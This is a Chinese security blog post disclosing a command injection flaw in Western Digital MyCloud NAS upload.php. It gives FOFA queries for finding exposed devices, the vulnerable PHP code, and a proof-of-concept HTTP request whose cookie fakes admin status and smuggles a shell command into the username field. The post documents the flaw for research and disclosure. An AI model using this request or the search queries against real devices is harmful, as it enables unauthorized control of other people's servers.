---
title: "西部数码 NAS php/upload.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-php-upload-rce.html
asset_dir: assets/西部数码-nas-phpupload.php-命令执行漏洞
---

# 西部数码 NAS php/upload.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/8 12:22
* 829浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

网页浏览器

Windows安全工具

安全研究工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS upload.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

安全运维咨询

SQL注入检测工具

漏洞预警服务

直接看 `upload.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);
```

深入探索

安全认证考试

计算机安全

Docker加速服务

从 `$_COOKIE` 中获取 `username` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 `exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 [RCE](https://mrxn.net/tag/rce)的效果。

计算机驱动器和存储设备

# 漏洞复现

```
GET /web/php/upload.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: isAdmin=1;username=a" `sleep 3` "
```

[![西部数码 NAS php/upload.php 命令执行漏洞](images/img-001-271f22f49542.webp)](https://image.mrxn.net/904a383ef0864fed8d68ed9acaa010bb.webp)

成功延时 3 秒

网络存储

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS php/upload.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-php-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-php-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-php-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

数据备份与恢复

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-php-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 